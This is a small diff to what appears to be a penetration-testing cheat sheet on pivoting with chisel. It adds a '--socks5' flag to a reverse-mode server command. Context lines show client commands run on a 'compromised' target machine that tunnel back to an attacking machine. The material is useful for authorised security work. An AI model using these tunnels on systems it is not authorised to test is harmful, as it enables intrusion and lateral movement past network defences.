@@ -211,7 +211,7 @@ chisel server [--host <0.0.0.0 | IP>] [-p <8080 | PORT>]
 
 # chisel client-side (on the target machine).
 # By default the port is opened client-side on all interfaces (<CLIENT_TUNNEL_IP> = 0.0.0.0) with a local (client-side) port matching the one of the forwarded service (<CLIENT_TUNNEL_PORT> = <SERVER_FORWARDED_PORT>).
-# Example: www.github.com:443 (<SERVER_FORWARDED_PORT>:<SERVER_FORWARDED_PORT>) to make GitHub accessible on the compromised client.  
+# Example: www.github.com:443 (<SERVER_FORWARDED_PORT>:<SERVER_FORWARDED_PORT>) to make GitHub accessible on the compromised client.
 chisel client <SERVER_IP>:<SERVER_PORT> <SERVER_FORWARDED_PORT>
 chisel client <SERVER_IP>:<SERVER_PORT> <SERVER_FORWARDED_PORT>:<SERVER_FORWARDED_PORT>
 chisel client <SERVER_IP>:<SERVER_PORT> <HOSTNAME | IP> <CLIENT_TUNNEL_IP>:<CLIENT_TUNNEL_PORT>:<SERVER_FORWARDED_IP>:<SERVER_FORWARDED_PORT>
@@ -241,7 +241,7 @@ through the compromised client:
 
 ```bash
 # chisel server-side (on the attacking machine).
-chisel server [--host <0.0.0.0 | IP>] [-p <8080 | PORT>] --reverse
+chisel server [--host <0.0.0.0 | IP>] [-p <8080 | PORT>] --reverse --socks5
 
 # chisel client-side (on the target machine).
 # By default the SOCKS proxy listen server-side on 127.0.0.1:1080 (<SERVER_TUNNEL_IP>:<SERVER_TUNNEL_PORT>).
